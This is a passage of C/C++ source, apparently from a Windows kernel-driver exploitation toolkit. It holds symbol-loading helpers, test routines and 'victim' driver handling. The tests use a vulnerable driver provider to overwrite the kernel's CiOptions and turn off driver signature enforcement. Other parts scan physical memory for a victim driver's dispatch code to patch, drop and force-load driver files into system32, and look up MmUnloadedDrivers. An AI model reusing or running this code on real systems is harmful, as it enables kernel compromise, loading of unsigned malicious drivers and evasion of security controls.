    _In_opt_ PMODLOAD_DATA Data,
    _In_opt_ DWORD Flags);

typedef BOOL(WINAPI* pfnSymFromName)(
    _In_ HANDLE hProcess,
    _In_ PCSTR Name,
    _Inout_ PSYMBOL_INFO Symbol);

pfnSymSetOptions SymSetOptionsProto;
pfnSymInitialize SymInitializeProto;
pfnSymLoadModuleEx SymLoadModuleExProto;
pfnSymFromName SymFromNameProto;

/*
* symLoadImageSymbols
*
* Purpose:
*
* SymLoadModuleEx wrapper.
*
*/
BOOL symLoadImageSymbols(
    _In_ LPCWSTR lpFileName,
    _In_ PVOID ImageBase,
    _In_ ULONG ImageSize)
{
    BOOL bResult = FALSE;

    if (g_symInitialized) {

        printf_s("[~] Please wait, loading symbols for %ws file.\r\n", lpFileName);

        bResult = (NULL != SymLoadModuleExProto(NtCurrentProcess(),
            NULL,
            lpFileName,
            NULL,
            (DWORD64)ImageBase,
            ImageSize,
            NULL,
            0));

        if (!bResult) {
            supShowWin32Error("[!] Failed to load symbols", GetLastError());
        }

    }

    return bResult;

}

/*
* symLookupAddressBySymbol
*
* Purpose:
*
* SymFromName wrapper.
*
*/
BOOL symLookupAddressBySymbol(
    _In_ LPCSTR SymbolName,
    _Out_ PULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    SIZE_T symSize;
    ULONG64 symAddress = 0;
    PSYMBOL_INFO symbolInfo = NULL;

    if (g_symInitialized) {

        symSize = sizeof(SYMBOL_INFO);

        symbolInfo = (PSYMBOL_INFO)supHeapAlloc(symSize);
        if (symbolInfo) {

            symbolInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
            symbolInfo->MaxNameLen = 0;

            bResult = SymFromNameProto(
                NtCurrentProcess(),
                SymbolName,
                symbolInfo);

            if (!bResult) {

                supPrintfEvent(kduEventError,
                    "Cannot find symbol for %s name, GetLastError %lu\r\n",
                    SymbolName,
                    GetLastError());

            }

            symAddress = symbolInfo->Address;

            supHeapFree(symbolInfo);
        }

    }

    *Address = symAddress;

    return bResult;
}

/*
* symInit
*
* Purpose:
*
* Load image help dlls and initialize symbols.
*
*/
BOOL symInit()
{
    DWORD cch;
    BOOL bInitSuccess = FALSE;

    if (g_symInitialized)
        return TRUE;

    SetDllDirectory(NULL);

    do {
        WCHAR szFileName[MAX_PATH * 2];

        RtlSecureZeroMemory(&szFileName, sizeof(szFileName));

        cch = GetCurrentDirectory(MAX_PATH, szFileName);
        if (cch == 0 || cch > MAX_PATH) {
            supShowWin32Error("[!] Cannot query current directory", GetLastError());
            break;
        }

        _strcat(szFileName, TEXT("\\"));

        LPWSTR lpEnd = _strend(szFileName);

        _strcat(lpEnd, TEXT("dbghelp.dll"));

        if (!RtlDoesFileExists_U(szFileName)) {
            return FALSE;
        }

        g_hDbgHelp = LoadLibrary(szFileName);
        if (g_hDbgHelp == NULL) {
            supShowWin32Error("[!] Cannot load dbghelp.dll, make sure it is in program directory", GetLastError());
            break;
        }
        *lpEnd = 0;
        _strcat(lpEnd, TEXT("symsrv.dll"));
        g_hSymSrv = LoadLibrary(szFileName);
        if (g_hSymSrv == NULL) {

            supShowWin32Error(
                "[!] Cannot load symsrv.dll, make sure it is in program directory",
                GetLastError());

            break;
        }

        SymSetOptionsProto = (pfnSymSetOptions)GetProcAddress(g_hDbgHelp, "SymSetOptions");
        SymInitializeProto = (pfnSymInitialize)GetProcAddress(g_hDbgHelp, "SymInitializeW");

        SymLoadModuleExProto = (pfnSymLoadModuleEx)GetProcAddress(g_hDbgHelp, "SymLoadModuleExW");
        SymFromNameProto = (pfnSymFromName)GetProcAddress(g_hDbgHelp, "SymFromName");

        if (SymSetOptionsProto == NULL ||
            SymInitializeProto == NULL ||
            SymLoadModuleExProto == NULL ||
            SymFromNameProto == NULL)
        {
            supPrintfEvent(kduEventError,
                "[!] Not all symbol API pointers resolved, abort\r\n");
            break;
        }

        SymSetOptionsProto(
            SYMOPT_CASE_INSENSITIVE |
            SYMOPT_UNDNAME |
            SYMOPT_FAIL_CRITICAL_ERRORS |
            SYMOPT_EXACT_SYMBOLS |
            SYMOPT_AUTO_PUBLICS);

        WCHAR szUserSearchPath[MAX_PATH * 2];
        WCHAR szTemp[MAX_PATH + 1];

        RtlSecureZeroMemory(&szUserSearchPath, sizeof(szUserSearchPath));
        RtlSecureZeroMemory(&szTemp, sizeof(szTemp));

        cch = ExpandEnvironmentStrings(L"%temp%", szTemp, MAX_PATH);
        if (cch > 0 && cch < MAX_PATH) {

            StringCchPrintf(szUserSearchPath,
                RTL_NUMBER_OF(szUserSearchPath),
                L"srv*%ws\\Symbols*https://msdl.microsoft.com/download/symbols",
                szTemp);

        }
        else {

            supShowWin32Error("[!] Cannot query temp directory", GetLastError());

            break;
        }

        bInitSuccess = SymInitializeProto(NtCurrentProcess(),
            szUserSearchPath,
            FALSE);

        if (!bInitSuccess) {
            supShowWin32Error("[!] SymInitialize failed", GetLastError());
        }
        else {
            supPrintfEvent(kduEventInformation, "[+] Symbols initialized\r\n");
        }

        g_symInitialized = bInitSuccess;

    } while (FALSE);

    if (!bInitSuccess) {
        if (g_hDbgHelp) {
            FreeLibrary(g_hDbgHelp);
            g_hDbgHelp = NULL;
        }
        if (g_hSymSrv) {
            FreeLibrary(g_hSymSrv);
            g_hSymSrv = NULL;
        }
    }

    return bInitSuccess;
}

```

`Source/Hamakaze/sym.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       SYM.H
*
*  VERSION:     1.30
*
*  DATE:        08 Apr 2023
*
*  Symbols routines header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#pragma once

BOOL symInit();

BOOL symLoadImageSymbols(
    _In_ LPCWSTR lpFileName,
    _In_ PVOID ImageBase,
    _In_ ULONG ImageSize);

BOOL symLookupAddressBySymbol(
    _In_ LPCSTR SymbolName,
    _Out_ PULONG_PTR Address);

```

`Source/Hamakaze/tests.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID KDUTestLoad()
{
    ULONG i;
    HINSTANCE hProv;
    PKDU_DB provLoadData;
    ULONG dataSize = 0;
    PVOID pvData;

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    provLoadData = KDUReferenceLoadDB();
    if (provLoadData == NULL)
        return;

    for (i = 0; i < provLoadData->NumberOfEntries; i++) {

        pvData = KDULoadResource(provLoadData->Entries[i].ResourceId,
            hProv,
            &dataSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (pvData) {
            printf_s("[+] Provider[%lu] loaded\r\n", provLoadData->Entries[i].ResourceId);
            supHeapFree(pvData);
        }
        else {
            printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
        }
    }
}

VOID KDUTestDSE(PKDU_CONTEXT Context)
{
    ULONG_PTR g_CiOptions = 0xfffff80541c391b0;//need update
    ULONG_PTR oldValue = 0, newValue = 0x0, testValue = 0;
    KDU_PROVIDER* prov = Context->Provider;

    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
        Beep(0, 0);
    }

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &newValue, sizeof(newValue));
        Beep(0, 0);
    }

    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &testValue, sizeof(testValue));

        if (testValue != newValue)
            Beep(1, 1);
    }

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
    }
}

BOOL WINAPI TestPhysMemEnumCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{

    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;

    ULONG signatureSize = Params->DispatchSignatureLength;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (Params->ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(Params->DispatchSignature,
            RtlOffsetToPointer(buffer, Params->DispatchHandlerPageOffset),
            signatureSize))
        {
            printf_s("\t Found code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;
        }
    }

    return FALSE;
}

VOID TestBrute(PKDU_CONTEXT Context)
{
    KDU_PHYSMEM_ENUM_PARAMS params;
    VICTIM_IMAGE_INFORMATION vi;
    HANDLE victimDeviceHandle = NULL;

    if (Context->Provider->Callbacks.ReadPhysicalMemory == NULL)
        return;

    if (VpCreate(Context->Victim, Context->ModuleBase, &victimDeviceHandle, NULL, NULL)) {

        RtlSecureZeroMemory(&vi, sizeof(vi));
        VpQueryInformation(Context->Victim, VictimImageInformation, &vi, sizeof(vi));

        params.DeviceHandle = Context->DeviceHandle;
        params.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        params.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        params.DispatchSignature = Context->Victim->Data.DispatchSignature;
        params.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        params.DispatchHandlerOffset = vi.DispatchOffset;
        params.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        params.JmpAddress = vi.JumpValue;

        params.bWrite = FALSE;
        params.cbPayload = 0;
        params.pvPayload = NULL;
        params.ccPagesFound = 0;
        params.ccPagesModified = 0;

        if (supEnumeratePhysicalMemory(TestPhysMemEnumCallback, &params)) {

            printf_s("[+] Number of pages found: %llu\r\n", params.ccPagesFound);

        }
    }
}

VOID TestSymbols()
{
    if (symInit()) {

        supResolveMiPteBaseAddress(0);

        HMODULE hModule = LoadLibraryEx(NTOSKRNL_EXE, NULL, DONT_RESOLVE_DLL_REFERENCES);

        if (hModule) {

            ULONG_PTR ntosBase = supGetNtOsBase();

            if (symLoadImageSymbols(NTOSKRNL_EXE, (PVOID)hModule, 0)) {

                ULONG_PTR address = 0;

                ///MmUnloadedDrivers
                if (symLookupAddressBySymbol("MmUnloadedDrivers", &address)) {

                    printf_s("[X] symbol address %llX\r\n\tkm address %llX\r\n",
                        address,
                        (ULONG_PTR)ntosBase + address - (ULONG_PTR)hModule);
                }

            }

        }
    }
}

VOID TestSuperfetch(PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    SUPERFETCH_MEMORY_MAP memoryMap;
    ULONG_PTR ntosBase;
    ULONG_PTR physAddress;

    UNREFERENCED_PARAMETER(Context);

    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);

    printf_s("[*] Building Superfetch memory map...\n");

    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
        printf_s("[-] Failed to build memory map\n");
        return;
    }

    printf_s("[+] Memory map built: %llu entries from %lu ranges\n",
        memoryMap.TableSize, memoryMap.RangeCount);

    ntosBase = supGetNtOsBase();
    printf_s("[*] ntoskrnl base: 0x%llX\n", ntosBase);

    if (supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
        printf_s("[+] Translated to physical: 0x%llX\n", physAddress);
    }
    else {
        printf_s("[-] Translation failed\n");
    }

    supFreeSuperfetchMemoryMap(&memoryMap);
}

VOID TestSuperfetchWithDriver(PKDU_CONTEXT Context)
{
    BOOLEAN oldValue = FALSE;
    SUPERFETCH_MEMORY_MAP memoryMap;
    ULONG_PTR ntosBase;
    ULONG_PTR physAddress;
    USHORT dosSignature = 0;
    KDU_PROVIDER* prov = Context->Provider;

    RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &oldValue);
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &oldValue);

    supPrintfEvent(kduEventInformation,
        "[+] Building Superfetch memory map...\n");

    if (!supBuildSuperfetchMemoryMap(&memoryMap)) {
        supPrintfEvent(kduEventError,
            "[-] Failed to build memory map\n");
        return;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Memory map built: %llu entries from %lu ranges\n",
        memoryMap.TableSize, memoryMap.RangeCount);

    ntosBase = supGetNtOsBase();
    supPrintfEvent(kduEventInformation,
        "[+] ntoskrnl base: 0x%llX\n", ntosBase);

    if (!supSuperfetchVirtualToPhysical(&memoryMap, ntosBase, &physAddress)) {
        supPrintfEvent(kduEventError,
            "[-] Translation failed\n");
        supFreeSuperfetchMemoryMap(&memoryMap);
        return;
    }

    supPrintfEvent(kduEventInformation,
        "[+] Translated to physical: 0x%llX\n", physAddress);

    //
    // Read MZ signature via physical memory
    //
    if (prov->Callbacks.ReadPhysicalMemory(
        Context->DeviceHandle,
        physAddress,
        &dosSignature,
        sizeof(dosSignature)))
    {
        if (dosSignature == IMAGE_DOS_SIGNATURE) {
            supPrintfEvent(kduEventInformation,
                "[+] MZ signature verified - translation OK\n");
        }
        else {
            supPrintfEvent(kduEventError,
                "[-] MZ signature mismatch: 0x%04X\n", dosSignature);
        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[-] Failed to read physical memory\n");
    }

    //
    // Test virtual memory read via provider
    //
    dosSignature = 0;
    if (prov->Callbacks.ReadKernelVM(
        Context->DeviceHandle,
        ntosBase,
        &dosSignature,
        sizeof(dosSignature)))
    {
        if (dosSignature == IMAGE_DOS_SIGNATURE) {
            supPrintfEvent(kduEventInformation,
                "[+] Virtual memory read verified - MZ signature OK\n");
        }
        else {
            supPrintfEvent(kduEventError,
                "[-] Virtual memory read MZ mismatch: 0x%04X\n", dosSignature);
        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[-] Failed to read virtual memory\n");
    }

    supFreeSuperfetchMemoryMap(&memoryMap);

    supPrintfEvent(kduEventInformation,
        "[+] All tests completed\n");
}

VOID KDUTest()
{
    PKDU_CONTEXT Context;

    // KDUTestLoad();
    // TestSymbols();
    Context = KDUProviderCreate(KDU_PROVIDER_TPUP,
        FALSE,
        NT_WIN10_20H1,
        KDU_SHELLCODE_V1,
        ActionTypeMapDriver);

    if (Context) {
        TestSuperfetch(Context);
        //TestSuperfetchWithDriver(Context);
        //TestBrute(Context);
        KDUTestDSE(Context);

        KDUProviderRelease(Context);
    }
}

```

`Source/Hamakaze/tests.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       TESTS.H
*
*  VERSION:     1.10
*
*  DATE:        02 Apr 2021
*
*  KDU test prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

VOID KDUTest();

```

`Source/Hamakaze/victim.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2026
*
*  TITLE:       VICTIM.CPP
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Victim support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* VpCreate
*
* Purpose:
*
* Load victim and obtain handle to it.
*
*/
BOOL VpCreate(
    _Inout_ PKDU_VICTIM_PROVIDER Context,
    _In_opt_ HINSTANCE ModuleBase,
    _Out_opt_ PHANDLE VictimHandle,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    supPrintfEvent(kduEventInformation,
        "[+] Processing victim \"%ws\" driver\r\n",
        Context->Desc);

    return Context->Callbacks.Create(
        ModuleBase,
        Context->Name,
        Context->ResourceId,
        Context->DesiredAccess,
        VictimHandle,
        &Context->Data.VictimImage,
        Callback,
        CallbackParam);
}

/*
* VpRelease
*
* Purpose:
*
* Unload victim and close it handle.
*
*/
BOOL VpRelease(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Inout_opt_ PHANDLE VictimHandle
)
{
    HANDLE victimHandle;

    if (VictimHandle) {
        victimHandle = *VictimHandle;
        if (victimHandle) {
            NtClose(victimHandle);
            *VictimHandle = NULL;
        }
    }

    if (Context->Data.VictimImage)
        VirtualFree(Context->Data.VictimImage, 0, MEM_RELEASE);

    return Context->Callbacks.Release(Context->Name);
}

/*
* VpExecutePayload
*
* Purpose:
*
* Execute payload inside victim.
*
*/
VOID VpExecutePayload(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Out_opt_ PHANDLE VictimHandle
)
{
    Context->Callbacks.Execute(Context->Name,
        Context->DesiredAccess,
        VictimHandle);
}

/*
* VppLoadUnloadDriver
*
* Purpose:
*
* Load/Unload driver using Native API.
* This routine will try to force unload driver on loading if Force parameter set to TRUE.
*
*/
NTSTATUS VppLoadUnloadDriver(
    _In_ LPCWSTR Name,
    _In_ LPCWSTR ImagePath,
    _In_ BOOLEAN Force,
    _In_ BOOLEAN Unload,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
    )
{
    NTSTATUS ntStatus;

    if (Unload) {
        ntStatus = supUnloadDriver(Name, TRUE);
    }
    else {
        ntStatus = supLoadDriverEx(Name, ImagePath, Force, Callback, CallbackParam);
    }

    return ntStatus;
}

/*
* VppBuildDriverName
*
* Purpose:
*
* Create filepath for given victim name.
*
*/
LPWSTR VppBuildDriverName(
    _In_ LPCWSTR VictimName
)
{
    LPWSTR lpFileName;
    SIZE_T cchLength = MAX_PATH * 2;
    SIZE_T cbLength = cchLength * sizeof(WCHAR);

    lpFileName = (LPWSTR)supHeapAlloc(cbLength);
    if (lpFileName == NULL) {
        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
    }
    else {

        if (FAILED(StringCchPrintf(lpFileName,
            cchLength,
            L"%ws\\system32\\drivers\\%ws.sys",
            USER_SHARED_DATA->NtSystemRoot,
            VictimName)))
        {
            supHeapFree(lpFileName);
            lpFileName = NULL;
            SetLastError(ERROR_BUFFER_OVERFLOW);
        }

    }

    return lpFileName;
}

/*
* VpCreateCallback
*
* Purpose:
*
* Drop, load and reference victim driver.
*
*/
BOOL VpCreateCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name, //same as device name
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    BOOL bResult = FALSE;
    NTSTATUS ntStatus;
    PBYTE  drvBuffer = NULL;
    ULONG  resourceSize = 0;
    LPWSTR driverFileName = NULL;
    HANDLE deviceHandle = NULL;

    if (VictimHandle)
        *VictimHandle = NULL;
    if (VictimImage)
        *VictimImage = NULL;

    driverFileName = VppBuildDriverName(Name);
    if (driverFileName) {

        do {

            if (supIsObjectExists((LPWSTR)L"\\Device", Name)) {

                supPrintfEvent(kduEventError,
                    "[!] Victim driver already loaded, force reload\r\n");

                supPrintfEvent(kduEventError,
                    "[!] Attempt to unload %ws\r\n", Name);

                ntStatus = VppLoadUnloadDriver(Name,
                    driverFileName,
                    FALSE,
                    TRUE,
                    NULL,
                    NULL);

                if (!NT_SUCCESS(ntStatus)) 
                {
                    supShowHardError("[!] Could not force unload victim, abort", ntStatus);
                    break;
                }
                else {
                    supPrintfEvent(kduEventInformation,
                        "[+] Previous instance of victim driver unloaded\r\n");
                }
            }

            drvBuffer = (PBYTE)KDULoadResource(ResourceId,
                ModuleBase,
                &resourceSize,
                PROVIDER_RES_KEY,
                TRUE);

            if (drvBuffer == NULL) {
                SetLastError(ERROR_FILE_NOT_FOUND);
                break;
            }

            if (VictimImage) {

                DWORD vSize = 0;
                PVOID vpImage = PELoaderLoadImage(drvBuffer, &vSize);

                if (vpImage == NULL) {

                    supPrintfEvent(kduEventError,
                        "[!] Could not map victim image, abort\r\n");

                    SetLastError(ERROR_INTERNAL_ERROR);
                    break;
                }

                printf_s("[+] Mapped victim image at %p with size 0x%lX bytes\r\n", vpImage, vSize);

                *VictimImage = vpImage;
            }

            ULONG writeBytes;

            printf_s("[+] Extracting victim driver \"%ws\" as \"%ws\"\r\n", Name, driverFileName);

            writeBytes = (ULONG)supWriteBufferToFile(driverFileName,
                drvBuffer,
                resourceSize,
                TRUE,
                FALSE,
                &ntStatus);

            supHeapFree(drvBuffer);

            if (resourceSize != writeBytes) {

                //
                // Driver is in use.
                //
                if (ntStatus == STATUS_SHARING_VIOLATION) {
                    supPrintfEvent(kduEventError,
                        "[!] Sharing violation, driver maybe in use, please close all application(s) that are using this driver\r\n");
                }
                else {

                    supShowHardError("[!] Could not extract victim driver, abort", ntStatus);

                }

                SetLastError(RtlNtStatusToDosError(ntStatus));
                break;
            }

            ntStatus = VppLoadUnloadDriver(Name,
                driverFileName,
                TRUE,
                FALSE,
                Callback,
                CallbackParam);

            if (NT_SUCCESS(ntStatus)) {

                SetLastError(ERROR_SUCCESS);

                if (VictimHandle) {

                    ntStatus = supOpenDriver(Name, DesiredAccess, &deviceHandle);
                    if (NT_SUCCESS(ntStatus)) {
                        *VictimHandle = deviceHandle;
                    }
                    else {
                        SetLastError(RtlNtStatusToDosError(ntStatus));
                    }
                }

                bResult = TRUE;

            }
            else {
                SetLastError(RtlNtStatusToDosError(ntStatus));
            }

        } while (FALSE);

        supHeapFree(driverFileName);
    }

    return bResult;
}

/*
* VpReleaseCallback
*
* Purpose:
*
* Unload victim driver.
*
*/
BOOL VpReleaseCallback(
    _In_ LPCWSTR Name
)
{
    BOOL bResult = FALSE;

    LPWSTR driverFileName = VppBuildDriverName(Name);
    if (driverFileName) {
        bResult = NT_SUCCESS(VppLoadUnloadDriver(Name, driverFileName, FALSE, TRUE, NULL, NULL));
        DeleteFile(driverFileName);
        supHeapFree(driverFileName);
    }

    return bResult;
}

/*
* VpExecuteCallback
*
* Purpose:
*
* Execute victim payload.
*
*/
VOID VpExecuteCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    supOpenDriver(Name, DesiredAccess, VictimHandle);
}

/*
* VpExecuteCallbackEx
*
* Purpose:
*
* Execute victim payload by IOCTL call.
*
*/
VOID VpExecuteCallbackEx(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    HANDLE victimHandle = NULL;
    ULONG dummy = 0;

    if (NT_SUCCESS(supOpenDriver(Name, DesiredAccess, &victimHandle))) {

        supCallDriver(victimHandle, 0xBADDAB, &dummy, sizeof(dummy), &dummy, sizeof(dummy));

    }

    *VictimHandle = victimHandle;
}

/*
* VppOpenExistingDriverDevice
*
* Purpose:
*
* Open existing victim by it device name.
*
*/
BOOL VppOpenExistingDriverDevice(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle
)
{
    HANDLE deviceHandle = NULL;
    NTSTATUS ntStatus;
    LPWSTR lpDeviceName;
    SIZE_T sz;

    if (VictimHandle)
        *VictimHandle = NULL;

    sz = 64 + (1 + _strlen(Name)) * sizeof(WCHAR);
    lpDeviceName = (LPWSTR)supHeapAlloc(sz);
    if (lpDeviceName) {

        StringCchPrintf(lpDeviceName,
            sz / sizeof(WCHAR),
            L"\\Device\\%ws",
            Name);

        ntStatus = supOpenDriverEx(lpDeviceName, DesiredAccess, &deviceHandle);
        if (NT_SUCCESS(ntStatus)) {
            if (VictimHandle)
                *VictimHandle = deviceHandle;
        }
        else {
            SetLastError(RtlNtStatusToDosError(ntStatus));
        }

        supHeapFree(lpDeviceName);
    }

    return (deviceHandle != NULL);
}

/*
* VpExecuteFromExistingCallback
*
* Purpose:
*
* Execute victim payload in existing loaded driver.
*
*/
VOID VpExecuteFromExistingCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle
)
{
    VppOpenExistingDriverDevice(Name, DesiredAccess, VictimHandle);
}

/*
* VpCreateFromExistingCallback
*
* Purpose:
*
* Create victim from existing loaded driver.
*
*/
BOOL VpCreateFromExistingCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name,
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam)
{
    UNREFERENCED_PARAMETER(Callback);
    UNREFERENCED_PARAMETER(CallbackParam);

    if (VictimHandle) *VictimHandle = NULL;

    if (VictimImage) {

        *VictimImage = NULL;

        DWORD resourceSize = 0;
        PBYTE drvBuffer = (PBYTE)KDULoadResource(ResourceId,
            ModuleBase,
            &resourceSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (drvBuffer == NULL) {
            SetLastError(ERROR_FILE_NOT_FOUND);
            return FALSE;
        }

        DWORD vSize = 0;
        PVOID vpImage = PELoaderLoadImage(drvBuffer, &vSize);

        supHeapFree(drvBuffer);

        if (vpImage == NULL) {

            supPrintfEvent(kduEventError,
                "[!] Could not map victim image, abort\r\n");

            SetLastError(ERROR_INTERNAL_ERROR);
            return FALSE;
        }

        printf_s("[+] Mapped victim image at %p with size 0x%lX bytes\r\n", vpImage, vSize);

        *VictimImage = vpImage;

    }

    return VppOpenExistingDriverDevice(Name, DesiredAccess, VictimHandle);
}

/*
* VpReleaseCallbackStub
*
* Purpose:
*
* Stub routine.
*
*/
BOOL VpReleaseCallbackStub(
    _In_ LPCWSTR Name
)
{
    UNREFERENCED_PARAMETER(Name);

    return TRUE;
}

/*
* VpLoadDriverCallback
*
* Purpose:
*
* supLoadDriverEx callback to store specific data in registry entry.
*
*/
NTSTATUS CALLBACK VpLoadDriverCallback(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param
)
{
    NTSTATUS ntStatus = STATUS_SUCCESS;
    VICTIM_LOAD_PARAMETERS* params;

    UNREFERENCED_PARAMETER(RegistryPath);
   
    if (Param == NULL)
        return STATUS_INVALID_PARAMETER_2;
    
    params = (VICTIM_LOAD_PARAMETERS*)Param;

    switch (params->Provider->VictimId) {
    case KDU_VICTIM_PE1627:
    case KDU_VICTIM_PE1702:
    default:
        break;
    }

    return ntStatus;
}

/*
* VpQueryInformation
*
* Purpose:
*
* Query various victim information.
*
*/
_Success_(return != FALSE)
BOOL VpQueryInformation(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _In_ VICTIM_INFORMATION VictimInformationClass,
    _Inout_ PVOID Information,
    _In_ ULONG InformationLength)
{
    BOOL bResult = TRUE;
    PVICTIM_IMAGE_INFORMATION imageInfo;
    PVICTIM_DRIVER_INFORMATION driverInfo;

    PVOID dispatchSignature = 0;
    ULONG signatureSize = 0;

    PVOID sectionBase;
    ULONG sectionSize;

    switch (VictimInformationClass) {

    case VictimImageInformation:

        if (InformationLength == sizeof(VICTIM_IMAGE_INFORMATION)) {

            imageInfo = (VICTIM_IMAGE_INFORMATION*)Information;

            dispatchSignature = Context->Data.DispatchSignature;
            signatureSize = Context->Data.DispatchSignatureLength;

            sectionBase = ntsupLookupImageSectionByName((CHAR*)TEXT_SECTION,
                TEXT_SECTION_LENGTH,
                (PVOID)Context->Data.VictimImage,
                &sectionSize);

            if (sectionBase && sectionSize) {

                PBYTE ptrCode = NULL;

                ptrCode = (PBYTE)ntsupFindPattern((PBYTE)sectionBase,
                    sectionSize,
                    (PBYTE)dispatchSignature,
                    signatureSize);

                if (ptrCode) {
                    imageInfo->DispatchOffset = (ULONG_PTR)ptrCode & 0xffff;
                    imageInfo->DispatchPageOffset = imageInfo->DispatchOffset & 0xfff;

                    LONG_PTR rel = (LONG_PTR)sectionBase - (LONG_PTR)ptrCode - 5;

                    imageInfo->JumpValue = (ULONG)rel;
                }
                else {
                    SetLastError(ERROR_NOT_FOUND);
                    bResult = FALSE;
                }

            }
            else {
                SetLastError(ERROR_SECTION_NOT_FOUND);
                bResult = FALSE;
            }

        }
        else {
            SetLastError(ERROR_INVALID_PARAMETER);
            bResult = FALSE;
        }

        break;

    case VictimDriverInformation:

        if (InformationLength == sizeof(VICTIM_DRIVER_INFORMATION)) {

            driverInfo = (VICTIM_DRIVER_INFORMATION*)Information;

            PRTL_PROCESS_MODULE_INFORMATION target;
